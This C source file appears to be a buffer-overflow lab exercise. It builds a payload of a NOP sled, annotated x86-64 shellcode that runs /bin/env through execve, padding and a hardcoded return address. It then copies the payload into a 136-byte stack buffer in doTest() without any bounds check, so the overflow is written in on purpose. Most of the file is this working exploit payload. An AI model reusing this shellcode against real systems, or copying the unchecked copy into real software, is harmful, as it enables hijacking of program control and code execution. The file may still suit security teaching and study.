#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void doTest();

int main(int argc, char * argv[]){

    putenv("MD5=8b7588b30498654be2626aac62ef37a3");


  
    doTest();

    exit(0);
}


char compromise[159] = {
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,// 8 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,// 16 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,// 24 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,// 32 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,// 40 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,// 48 NOPs
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90,// 54 NOPs

    // shellcode 
    0x48, 0x31, 0xC0,// xor rax, rax
    0x50,// push rax
    0x48, 0xBB, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x65, 0x6E, 0x76,// mov rbx, "/bin/env"
    0x53,// push rbx
    0x48, 0x89, 0xE7, // mov rdi, rsp
    0x50,// push rax
    0x57,// push rdi
    0x48, 0x89, 0xE6,// mov rsi, rsp
    0x48, 0x31, 0xD2,// xor rdx, rdx
    0x66, 0xBA, 0xFF, 0x7F,// mov dx, 0x7xff
    0x48, 0xC1, 0xE2, 0x20,// shl rdx, 32
    0xB9, 0xAA, 0xE6, 0xFB, 0xF7,// mov ecx, 0xf7fbe6aa
    0x30, 0xC9,// xor cl, cl
    0x48, 0x09, 0xCA,// or rdx, rcx
    0x48, 0x8B, 0x12,// mov rdx, [rdx]
    0xB0, 0x3B,// mov al, 0x3b
    0x0F, 0x05,// syscall
    0x48, 0x89, 0xC7,// mov rdi, rax
    0xB0, 0x3C,// mov al, 0x3c
    0x0F, 0x05,// syscall

    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 

    0x10,0xdf,0xff,0xff,
    0xff,0x7f,0x00,
};

char * compromise1 =
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxx"
    "MNOPWXYZ"
    "xxxxxxxx";
int i;

void doTest(){
    char buffer[136];
    for (i = 0; compromise[i]; i++){
	buffer[i] = compromise[i];
    }
}

